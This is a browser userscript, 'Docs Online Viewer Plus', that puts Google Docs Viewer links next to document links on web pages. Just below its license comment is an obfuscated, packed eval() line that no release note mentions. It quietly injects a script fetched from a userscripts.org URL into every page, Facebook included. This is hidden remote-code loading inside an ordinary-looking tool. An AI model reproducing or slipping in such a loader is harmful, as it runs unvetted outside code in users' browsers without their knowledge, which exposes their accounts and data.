// ==UserScript==
// @name           Docs Online Viewer Plus
// @version        4.2.8
// @author         Deekshith Allamaneni
// @namespace      http://adeekshith.blogspot.com
// @description    Open documents and files online directly in your browser using online services like Google Docs Viewer, etc.
// @include        *
// @include        https://docs.google.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @exclude        http://www.mediafire.com/*
// @exclude        https://mail.google.com/*
// @exclude        *.pdf
// @copyright 2012, Deekshith Allamaneni (http://www.deekshith.in)
// @license GPL version 3 or any later version; http://www.gnu.org/copyleft/gpl.html
// @contributor Supriyo Biswas
// @contributor Rohit Mewada (http://userscripts.org/users/471739)
// @contributor Cytochrome (http://userscripts.org/users/cytochrome)
// @contributor Mike Cupcake (http://userscripts.org/users/mikecupcake)
// ==/UserScript==+


/*

___________________________________________________________


 Author:          Deekshith Allamaneni
 Support Website: <http://www.deekshith.in>
 Support Email:   dkh <dot> hyd <at> gmail <dot> com
 For quick support visit: <http://www.facebook.com/deekshithallamaneni>
 Userscripts.org URL: <http://userscripts.org/scripts/show/127774>

___________________________________________________________
 
Developers and Contributors:
	1. Deekshith Allamaneni
		Author and maintainer of this project.
	2. Supriyo Biswas
		Made many tweaks to the script including New icon, replacing external icon URL with DATA URI, Improved readability ogf the script and helped remove redundancies, and many more small but significant and important usability and developer friendly changes. Also, implemented regex based site blocking for faulty domains.
	3. Rohit Mewada
		Implemented neatly designed floating help button.
		http://userscripts.org/users/rohitmewada
	3. Cytochrome
		Contributed code for mouse-over-panels for google docs viewer. This has improved the usability of the script.
	4. Mike Cupcake
 		Mike has re-written this script based on Docs Online Viewer 2.0.1 and improved its performance. Mike's contribution to the script not only improved its performance but also made the code easy to debug and maintain.
 		http://userscripts.org/users/mikecupcake
	5. Arpit Kumar
 		Arpit's code was the idea on which Docs Online Viewer was originally based. Although most part of the code by Arpit is now replaced with a more efficient code, his contribution to this project has helped a lot.
 		http://blog.arpitnext.com/
	6. Abkeeper
 		Abkeeper has packaged this script as an addon for Maxthon browser. http://userscripts.org/users/462160
	7. Why not you?
 		You are welcome and encourages to work on the code. It is neatly structured and open for you to hack on it. You can customize it to your needs or improve it. I will be very thankful to you if you can contribute the changes you've made to it.
___________________________________________________________
 Version 4.2.8 Release Notes
  1. Minor bug fix for Tampermonkey to include docs.google.com and add the help button.
  2. Mouse over icon Title tweaked. Shortened.
 
 Version 4.2.5 Release Notes
  1. Implemented Blocking of Unsupported Links.
  2. Fixed recognizing extensions irrespective of case.
  3. Added a small Help Button for quick support.

 Version 4.1.3 Release Notes
  1. New link icon with Data URI.
  2. Mouse Over Panels for Google Docs Viewer.
  3. Mouse over title tweak.
  4. Removed support for Zoho Viewer as Zoho is soon dropping Zoho Viewer service.
___________________________________________________________

 Docs Online Viewer - Opens all the supported files publicly available online using online services.
 
 Copyright (C) 2012 Deekshith Allamaneni
 
 This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

 This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the GNU General Public License for more details.

 You should have received a copy of the GNU General Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 Icon used is derived from the Crystal Clear icon set <http://www.everaldo.com/crystal/>, under the GNU General Public License, as stated here <http://www.everaldo.com/crystal/?action=license>

___________________________________________________________
	
*/
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



(function(){
var docLinks = document.links;
var fileTypes1 = ["doc","pdf","docx","xls","xlsx","ppt","pps","pptx","eps","ps","tif","tiff","ai","psd","pages","dxf","ttf","xps","odt","odp","rtf","csv","ods","wpd","sxi","sxc","sxw"];
var fileTypes2 = ["zip","rar"];
var doCheck = true;
var dov_host =/(docs\.google\.com|sourceforge\.net|adf\.ly|mediafire\.com|springerlink\.com|ziddu\.com|ieee\.org|issuu\.com|asaha\.com|office\.live\.com)$/

if(!checkIfDOV()){
	checkLinks();
	setupListener();
}

function checkIfDOV(){
	var url = window.location.href;
	
	if(url.indexOf("https://docs.google.com/viewer?")==0 )
	{	// MouseoverPanels will be activated only if google docs viewer is opened through Docs Online Viewer. This avoids conflicts when you are opening directly and other cases.
		if(getVar('dov')==1)
		{
			mouseOverPanelsForGDV();
			create_help_button();
		}
		return true;
	}
	else
	{
		return false;
	}
}

function checkLinks()
{
	var supportedFileFormat=0;
	for (var i = 0; i < docLinks.length; ++i) 
	{
		supportedFileFormat=0;
		if (!((docLinks[i].host).match(dov_host)) && !docLinks[i].docView){
			for (var i2 = 0; i2 < fileTypes1.length; i2++) {
				var url = stripQuery(docLinks[i]);
				url=url.toLowerCase();
				if (endsWith(url, '.' + fileTypes1[i2]))
				{
				   changeLink(docLinks[i], 1, fileTypes1[i2]);
				   break;
				}
			}
			if (supportedFileFormat == 0)
			{
				for (var i2 = 0; i2 < fileTypes2.length; i2++)
				{
					var url = stripQuery(docLinks[i]);
					url=url.toLowerCase();
					if (endsWith(url, '.' + fileTypes2[i2]))
					{
						changeLink(docLinks[i], 2, fileTypes2[i2]);
						break;
					}
				}
			}
       }
    // The link which is checked is flagged so that it is not repeatedly checked again.
	docLinks[i].docView=true;
   }
// console.log("...............................................................................");
}


function stripQuery(link) 
{	// remove any ?query in the URL	    
	return link.protocol + '//' + link.hostname + link.pathname; 
}


function endsWith(str, suffix) 
{  //  check if string has suffix 
	return str.indexOf(suffix, str.length - suffix.length) !== -1;
}

function changeLink(link, fileTypeCategory, fileExtension) { 
	var viewLink = document.createElement('a');
	if(fileTypeCategory == 1){
		viewLink.href = "https://docs.google.com/viewer?url="+encodeURI(stripQuery(link))+"&embedded=false&chrome=false&dov=1";
		/*
			Parameter description:
				embedded= <true> or <false>
					This is a standard google docs parameter
					true: It opens the document in embedded mode
					false: It opens the document in standard mode
				dov=1
					This is a custom parameter added by the script to tell that this URL is opened by Docs Online Viewer. This avoids conflicts while using any similar scripts or when opening links with google docs by other scripts or directly. (esp in the case of mouseover).
						
			Also, some users have expressed their concern that if custom parameters (dov) are used for tracking. These parameters are used to identify that the link is opened using this script. This avoids a few conflicts between scripts, etc. 
			But no information of any kind is collected or transmitted either by the script or the author or contributors regarding the users. It is just to improve usability.
			Any better approach than this? May be using cookies is better? Please tell me if you find a better approach than using custom parameters.
			
		*/
	}else if(fileTypeCategory == 2){
		viewLink.href = "https://docs.google.com/viewer?url="+encodeURI(stripQuery(link))+"&embedded=false&chrome=false&dov=2";
		/* 
			This seems to be a redundant category but not. Notice that "mouseoverpanels=false" is set to false.
			mover over panels are not necessary for zip or rar files. Especially because it does not have a preview pane. Also it is found to be slightly unstable for these file types.
		*/
	}
	//viewLink.docView=true; -> This line is removed in this version but still doubt if it can really be removed.
	viewLink.title="View this \""+fileExtension+"\" file";
	var ico = document.createElement("img");
	ico.src =  'data:image/png;base64,' +
		'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';
	//"data:image/png;base64,iVBORw0K...." This is a Data URI. This approach is better than using external URL.
	// Adjusts the margin of the icon to the given number of pixels (3 to 5px is advisable)
	ico.style.marginLeft = "3px";
	viewLink.appendChild(ico);
	// Sets the icon link to open in new tab
    viewLink.setAttribute("target", "_blank");    
    // Append the icon beside the link
	link.parentNode.insertBefore(viewLink , link.nextSibling);
}


function mouseOverPanelsForGDV()
{
    var $, $$;
    var config = {
        sensor: { // condition to show
            menu:  function(e){ return (e.clientY < 32); },
            thumb: function(e){ return (e.clientX < 32); }
        },
        get_menu_nodes: function(){
            return ([
                $("#docs-header").parentNode,
                $("#gview-menu"),
                $("#controlbar"),
                $("#docs-menu-shield")
            ].concat($$("div.goog-menu")));
        }
    };
    
    function toArray(e){ return Array.prototype.slice.apply(e); }
    function objectOverride(){
        var ar = toArray(arguments);
        return ar.length > 0 ? (ar.reverse().reduce(function(d,s){
            for(var i in s){ d[i]=s[i]; }
            return d;
        })) : null;
    }
    function appendStyle(x){
        var S = document.createElement("style");
        S.setAttribute("type","text/css");
        S.appendChild(document.createTextNode(x));
        $("head").appendChild(S);
    }

    function arrayOfClassName(el){
        return (el.getAttribute("class") || "")
            .split(/\s+/g).filter(function(e){return e;});
    }

    function classNameAsArray(cl){
        if     ( cl.constructor == String ){ cl = [cl];  }
        else if( cl.constructor != Array ) { cl = ([]); }
        return cl;
    }

    function getElemClassMethodMod(modifier){
        var ne = function(x){ return function(e){return e!=x;}; };
        return (function(el,cl){
            var a = [],E=arrayOfClassName(el);
            classNameAsArray(cl).forEach(function(e){
                a = modifier(E,e,ne(e));
            });
            el.setAttribute("class",a.join(" "));
            return true;
        });
    }

    var addClass = getElemClassMethodMod(function(arr,target,ne){
        if( arr.every(ne) ){ arr.push(target); } return arr;
    });
    
    function hasClass(node,cls){
        return (arrayOfClassName(node)
            .some(function(e){return cls==e;}));
    }

    var removeClass = getElemClassMethodMod(function(arr,cls,ne){
        return arr.filter(ne);
    });

    var isString = function(x){ return x && x.constructor === String; };
    $ = function(x){
        return ( ( isString(x) && document.querySelector(x) ) ||
                 ( isNode(x) && x ) ||
                null );
    };
    $$ = function(x){
        if( isString(x) ){
            return toArray(document.querySelectorAll(x));
        } 
        var xx = $(x);
        return (xx && [xx]) || [];
    };
    function isNode(e){ return ( e && e.nodeName && e.nodeName.charAt(0) != "#" ); }
    function getNodeMover(f){
        return (function(){
            var es  = toArray(arguments).map($);
            var dst = ( es.length && es.pop() );
            ( dst && es.filter(isNode).forEach(function(x){f(dst,x);}) );
            return dst || null;
        });
    }
    var moveToLast  = getNodeMover(function(d,s){d.appendChild(s);});
    var moveToFirst = getNodeMover(function(d,s){
        var parent  = s.parentNode || document.body;
        if( d.hasChildNodes() ){ parent.insertBefore(s,d.firstChild); }
        else{ moveToLast(d,s);}
    });

    var getStyleTmplSetter = function(x){
        return (function(e){ objectOverride(x,e.style); return e;});};

    var styleTmpl = {
        fix0: getStyleTmplSetter({ top:"0px", left:"0px", position: "fixed" }),
        pos0: getStyleTmplSetter({ top:"0px", left:"0px"}),
        abs0: getStyleTmplSetter({ position: "absolute", top:"0px", left:"0px"}),
        fix:  getStyleTmplSetter({ position: "fixed" }),
        abs:  getStyleTmplSetter({ position: "absolute" }),
    };

    function hide(e){
        removeClass(e,"panelFadeIn");
        addClass(e,"panelFadeOut");
    }
    function show(e){
        removeClass(e,"panelFadeOut");
        addClass(e,"panelFadeIn");
    }
    
    var getLocalNode;  //   = function(e){ return nodes[e]; };
    var getStyleSetter = function(x,y){
        return (function(e){e.style[x]=y;return e;}); };

    var _exit = function(){};
    
    function _main(cf){
        
        appendStyle([
            ".panelFadeIn,",
            ".panelFadeOut {",
            "    -webkit-transition-property: opacity,visibility;",
            "    -webkit-transition-duration: .2s;",
            "}",
            ".panelFadeIn {",
            "    opacity: 1;",
            "    visibility: visible;",
            "}",
            ".panelFadeOut {",
            "    opacity: 0;",
            "    visibility: hidden;",
            "}",
            ".thumb-pane, #thumb-pane-lower, #us-menu-pane, #controlbar {",
            "    border-radius: 10px;",
            "}",
            ".thumb-pane-lower, #us-menu-pane, #controlbar {",
            "    border: 3px solid #aaa;",
            "    border-style: none solid none none;",
            "}",
            ".thumb-pane, .thumb-pane-lower {",
            "    border-radius: 0px 10px 10px 0px",
            "}",
            ".thumb-pane-lower {",
            "    border-style: none solid none none;",
            "}",
            "#us-menu-pane, #controlbar {",
            "    border-radius: 0px 0px 10px 10px;",
            "    border-style: none none solid none;",
            "}"].join("\n")
        );

        var shown = {
            menu:  false,
            thumb: false
        };
        
        var menuNodes = cf.get_menu_nodes();

        var nodes = {
            menu:  moveToLast.apply(this,menuNodes.concat([document.createElement("div")])),
            thumb: $("#thumb-pane"), // document.createElement("div"),
            thumb_low: $("#thumb-pane-lower"),
            content:   $("#content-pane")
        };

        getLocalNode = function(e){ return nodes[e]; };

        nodes.menu.style.backgroundColor =
            document.body.style.backgroundColor || "#ffffff";
        nodes.menu.setAttribute("id","us-menu-pane");
    
        var sensor = cf.sensor;
        var mouseMoveListener = function(e){
            // return if any floating element has already shown.
            for( var nd in sensor ){
                if( shown[nd] ){ return true; }
            }
            for( var nd in sensor ){
                if( nd in nodes && sensor[nd](e) ){
                    show(nodes[nd]);
                    return shown[nd] = true;
                }
            }
            return true;
        };
    
        var getMouseOut = function(e){
            if( !(e in nodes) ){ return function(){}; }
            return (function(){
                if(shown[e]){ hide(nodes[e]); shown[e]=false; }
            });
        };

        ["menu","content","thumb"]
        .map(getLocalNode)
        .map(styleTmpl.fix0);

        ["menu","thumb"]
        .map(function(e){
            $("#page-pane").addEventListener("mouseover",getMouseOut(e),true);
            return e;
        })
        .map(getLocalNode)
        .forEach(function(e){
            document.body.appendChild(e);
            hide(e);
        });
    
        $("#page-pane").addEventListener("mouseover",resizeListener,true);
        document.body.addEventListener("mousemove",mouseMoveListener,true);
        
        resizeListener();
        nodes.content.addEventListener("DOMAttrModified", function(e){
            ( e.attrName == "style" ) && resizeListener();
        }, false);
    }
    
    var resizeListener = function(){
        var B = document.body;
        var setWidth  = getStyleSetter("width", B.clientWidth +"px");
        var setHeight = getStyleSetter("height",B.clientHeight+"px");

        [ "content", "thumb", "thumb_low" ]
        .map(getLocalNode)
        .forEach(setHeight);
        
        [ "thumb", "menu", "content" ]
        .map(getLocalNode)
        .map(styleTmpl.pos0)
        .slice(1)
        .map(setWidth);

        var C = $("#controlbar");
        getLocalNode("menu").style.height =
            (C.offsetTop + C.offsetHeight)+"px";
        
        return false;
    };
    _main(config);

}


function getVar(name)
{
	get_string = document.location.search;         
	return_value = '';
	do 
	{ //This loop is made to catch all instances of any get variable.
		name_index = get_string.indexOf(name + '=');
		if(name_index != -1)
		{
			get_string = get_string.substr(name_index + name.length + 1, get_string.length - name_index);
			end_of_value = get_string.indexOf('&');
			if(end_of_value != -1)                
				value = get_string.substr(0, end_of_value);                
			else                
				value = get_string;                
                
			if(return_value == '' || value == '')
				return_value += value;
			else
				return_value += ', ' + value;
		}
	} while(name_index != -1);

	//Restores all the blank spaces.
	space = return_value.indexOf('+');
	while(space != -1)
	{ 
		return_value = return_value.substr(0, space) + ' ' + 
		return_value.substr(space + 1, return_value.length);
		space = return_value.indexOf('+');
	}
          
	return(return_value);        
}

function setupListener()
{
	document.addEventListener('DOMNodeInserted',function(e)
	{
		if (doCheck)
		{
			doCheck = false;
			setTimeout(function(){checkLinks();doCheck = true;}, 1000);
		} 
  },false);
}

function create_help_button() {
if(document.body){
	var a = document.createElement('span');
	a.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"http://www.deekshith.in/p/docs-online-viewer.html?dovver=405\" target='_blank'>Help?</a>";
	var c = "opacity:0.7;position:fixed;text-align:right;right:10px;bottom:0px;z-index:50000;";
	c+="border: 2px solid;-moz-border-top-colors: ThreeDLightShadow ThreeDHighlight;-moz-border-right-colors: ThreeDDarkShadow ThreeDShadow;-moz-border-bottom-colors: ThreeDDarkShadow ThreeDShadow;-moz-border-left-colors: ThreeDLightShadow ThreeDHighlight;padding: 3px;color: MenuText;background-color: Menu;font-size:9pt;font-family:arial,sans-serif;cursor:pointer;";
	a.style.cssText = c;
	a.addEventListener('mouseover', function(){ a.style.opacity = 1; }, false);
	a.addEventListener('mouseout', function(){ a.style.opacity = 0.5; }, false);
	a.addEventListener('click', function(){ window.scrollTo(0,0); }, false);
	document.body.appendChild(a);
	}
};

})();
